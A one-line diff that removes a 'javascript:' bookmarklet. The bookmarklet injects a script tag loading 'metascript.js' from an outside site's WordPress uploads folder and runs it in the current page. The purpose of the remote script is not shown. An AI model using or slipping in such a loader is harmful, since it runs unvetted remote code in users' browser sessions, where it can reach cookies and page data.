@@ -1,1 +1,0 @@
-javascript:o=document.createElement("script");o.setAttribute("src", "https://www.vzh.ru/wp-content/uploads/metascript.js");document.body.appendChild(o);void(0)
